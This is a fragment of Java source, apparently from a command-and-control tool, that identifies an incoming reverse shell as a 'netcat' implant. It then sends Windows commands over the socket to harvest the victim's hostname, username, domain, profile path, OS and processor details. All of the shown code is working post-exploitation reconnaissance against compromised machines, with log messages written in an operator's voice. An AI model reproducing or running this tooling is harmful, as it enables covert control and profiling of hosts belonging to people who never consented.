        sendCommand_RAW_ToAgent("");

        String strFourthLine = brSocket.readLine();

        if ((strFourthLine != null) && (strFourthLine.trim().endsWith(">")))
        {
          Driver.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");

          this.myIMPLANT_ID = 1;
          try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }


          this.myImplantInitialLaunchDirectory = strFourthLine;

          brSocket.readLine();
        }

      }

      sendCommand_RAW_ToAgent("hostname");
      brSocket.readLine();
      this.myHostName = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %username%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserName = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %homedrive%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myHomeDrive = brSocket.readLine();
      if ((this.myHomeDrive != null) && (this.myHomeDrive.trim().equals("%homedrive%")))
      {
        this.myHomeDrive = " - ";
      }

      sendCommand_RAW_ToAgent("echo %NUMBER_OF_PROCESSORS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myNumberOfProcessors = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %OS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS_Type = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %PROCESSOR_ARCHITECTURE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myProcessorArchitecture = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %SystemRoot%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.mySystemRoot = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %USERDOMAIN%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserDomain = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %USERPROFILE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserProfile = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %TEMP%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myTempPath = brSocket.readLine();

      Driver.sop("PUNT!!!  Nope. I am stopping the interrogation of this system early.  I did not expect to encounter an agent running an older version of cmd.exe and it is unclear if I can interact with wmic on the target.  If needed, contact Splinter and ask for the methods to continue the interrogation.");

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("interrogateNewAgent_NETCAT_OLDER", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}